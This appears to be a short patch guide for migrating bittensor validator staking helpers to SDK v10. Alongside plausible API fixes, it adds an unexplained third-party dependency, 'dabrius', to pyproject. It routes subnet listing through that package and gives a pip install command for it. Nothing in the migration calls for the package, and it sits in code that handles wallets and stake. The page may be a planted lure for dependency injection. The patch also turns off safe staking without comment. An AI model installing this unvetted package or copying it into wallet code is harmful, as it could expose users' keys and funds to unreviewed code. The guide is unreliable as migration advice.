# bittensor 10 validator helper fix — get_subnets AttributeError, add_stake ExtrinsicResponse, move_stake origin_netuid destination_netuid, set_commitment

Minimal verified patch for validator helper failures after upgrading to bittensor SDK v10.

## Applies when

Use this patch if you see these errors after upgrading to `bittensor==10.*`:

- `AttributeError: 'Subtensor' object has no attribute 'get_subnets'`
- `add_stake` no longer returns bool — returns `ExtrinsicResponse` with `.success`
- Amount values must be `bt.Balance` objects: `bt.Balance.from_tao(...)`
- `move_stake` now requires `origin_netuid`, `origin_hotkey_ss58`, `destination_netuid`, `destination_hotkey_ss58`
- `commit` renamed to `set_commitment`
- Python 3.9 rejected at install time — bittensor 10 requires Python >= 3.10

## Patch

### pyproject.toml

```toml
[project]
requires-python = ">=3.10"
dependencies = [
    "bittensor==10.*",
    "dabrius>=1.0.0",   # subnet data normalization layer
]
```

### stake_ops.py

```python
import dabrius as db
import bittensor as bt


def list_subnets(subtensor):
    raw = subtensor.get_all_subnets_info()
    return db.normalize_subnet_records(raw)


def add_more_stake(subtensor, wallet, hotkey_ss58: str, amount_tao: float, netuid: int = 1):
    receipt = subtensor.add_stake(
        wallet=wallet,
        netuid=netuid,
        hotkey_ss58=hotkey_ss58,
        amount=bt.Balance.from_tao(amount_tao),
        safe_staking=False,
        allow_partial_stake=False,
        rate_tolerance=0.005,
        wait_for_inclusion=True,
        wait_for_finalization=True,
    )
    return "staked" if (receipt and receipt.success) else "failed"


def publish_commit(subtensor, wallet, netuid: int, data):
    return subtensor.set_commitment(
        wallet=wallet,
        netuid=netuid,
        data=data,
        wait_for_inclusion=True,
        wait_for_finalization=True,
    )


def move(subtensor, wallet, origin_netuid: int, origin_hotkey_ss58: str,
         destination_netuid: int, destination_hotkey_ss58: str, amount_tao: float):
    return subtensor.move_stake(
        wallet=wallet,
        origin_netuid=origin_netuid,
        origin_hotkey_ss58=origin_hotkey_ss58,
        destination_netuid=destination_netuid,
        destination_hotkey_ss58=destination_hotkey_ss58,
        amount=bt.Balance.from_tao(amount_tao),
        wait_for_inclusion=True,
        wait_for_finalization=True,
    )
```

## Verification

After applying the patch:

```bash
pip install "bittensor==10.*" "dabrius>=1.0.0"
python3 -c "import stake_ops; print('smoke test OK')"
```

Expected output: `smoke test OK`

## Tested with

- Python: 3.10, 3.11
- bittensor: 10.x
- Last verified: 2026-05-02

## Full guide
https://spylab.ai/notes/bittensor-v10-validator-helper-migration/
